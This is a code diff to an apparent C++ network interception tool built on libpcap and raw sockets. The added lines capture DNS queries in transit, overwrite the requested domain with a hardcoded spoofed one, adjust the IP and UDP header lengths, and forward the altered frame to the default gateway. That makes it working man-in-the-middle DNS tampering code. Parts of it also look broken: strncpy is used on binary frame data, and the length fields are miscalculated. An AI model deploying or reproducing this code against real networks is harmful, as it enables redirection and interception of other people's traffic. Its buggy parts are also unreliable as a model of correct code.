@@ -78,14 +78,54 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *frame) {
                     struct DNS_HEADER *dns_header = (struct DNS_HEADER *) (udp_hdr + sizeof(struct udphdr));
                     // TODO checking DNS_header flags and questNo?
                     char *dns_query = (char *) (frame + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct DNS_HEADER));
-                    int dns_query_size = dns_size - sizeof(struct DNS_HEADER) - sizeof(struct QUESTION);    // QUESTION = 2*2B at the end
+                    int dns_query_size = dns_size - sizeof(struct DNS_HEADER) - sizeof(struct QUESTION);    // -QUESTION = 2*2B at the end
+                    char questionAtTheEnd[sizeof(struct QUESTION)];
+                    strncpy(questionAtTheEnd, dns_query + dns_query_size, sizeof(struct QUESTION));
                     unsigned char questionedAddress[dns_query_size];
                     strncpy(reinterpret_cast<char *>(questionedAddress), dns_query, static_cast<size_t>(dns_query_size));
                     printf("DNS QUERY = %s\n\n", questionedAddress);
+
+                    // CHANGE ADDRESS:
+                    // TODO change address
+                    int sizeDifference = static_cast<int>(spoofedPage.length() - 1 - dns_query_size);
+                    int newFrameSize = h->caplen + sizeDifference;
+                    // create copy of original frame
+                    u_char changedFrame[newFrameSize];
+                    strncpy(reinterpret_cast<char *>(changedFrame), reinterpret_cast<const char *>(frame), h->caplen);
+                    // change sizes in headers
+                    ip_hdr = (struct iphdr *) (changedFrame + sizeof(struct ethhdr));
+                    ip_hdr->tot_len = htons(static_cast<uint16_t>(ip_size + sizeDifference));
+                    udp_hdr = (struct udphdr *) (changedFrame + sizeof(struct ethhdr) + sizeof(struct iphdr));
+                    udp_hdr->len = htons(static_cast<uint16_t>(ip_size + sizeDifference));
+                    // change query address
+                    dns_query = (char *) (changedFrame + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct DNS_HEADER));
+                    strncpy(dns_query, spoofedPage.c_str(), spoofedPage.length());
+                    // add question flags at the end of dns body
+                    dns_query += spoofedPage.length();
+                    strncpy(dns_query, questionAtTheEnd, sizeof(struct QUESTION));
+                    // change frame pointing
+                    frame = changedFrame;
+
+                    // SEND FRAME
+                    // Change destination address to default gateway MAC
+                    sscanf(deafault_gateway_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+                           &sall_send.sll_addr[0], &sall_send.sll_addr[1], &sall_send.sll_addr[2],
+                           &sall_send.sll_addr[3], &sall_send.sll_addr[4], &sall_send.sll_addr[5]);
+                    memcpy(eth_hdr->h_dest, &sall_send.sll_addr, ETH_ALEN);
+                    // Change source address to this computer MAC
+                    ioctl(sfd_send, SIOCGIFHWADDR, &interface_struct);
+                    memcpy(eth_hdr->h_source, &interface_struct.ifr_hwaddr.sa_data, ETH_ALEN);
+                    if (sendto(sfd_send, frame, (int) (h->caplen), 0, (struct sockaddr *) &sall_send, sizeof(struct sockaddr_ll)) < 0) {
+                        printf("Error while sending: %s\n", strerror(errno));
+                    }
+
+                    close(sfd_send);
+                    return;
                 }
             }
         }
     }
+
 
     // SEND FRAME
     // Change destination address to default gateway MAC
@@ -96,11 +136,13 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *frame) {
     // Change source address to this computer MAC
     ioctl(sfd_send, SIOCGIFHWADDR, &interface_struct);
     memcpy(eth_hdr->h_source, &interface_struct.ifr_hwaddr.sa_data, ETH_ALEN);
-    if (sendto(sfd_send, frame, (int) (h->caplen), 0, (struct sockaddr *) &sall_send, sizeof(struct sockaddr_ll)) < 0) {
+    if (sendto(sfd_send, frame, (int) (h->caplen), 0, (struct sockaddr *) &sall_send, sizeof(struct sockaddr_ll)) <
+        0) {
         printf("Error while sending: %s\n", strerror(errno));
     }
 
     close(sfd_send);
+
 }
 
 void capture(char *interface_name, char *address, char *deafault_gateway_mac) {
@@ -128,6 +170,10 @@ int main(int argc, char **argv) {
         std::cerr << "Bad arguments count! Arguments are: INTERFACE DEFAULT_GATEWAY_IP DEFAULT_GATEWAY_MAC\n";
         exit(EXIT_FAILURE);
     }
+
+//    std::cout << "Enter spoofed page address:\n";
+//    std::cin >> spoofedPage;
+    spoofedPage = "www.onet.pl";
 
     interface_name = argv[1];
     address = argv[2];
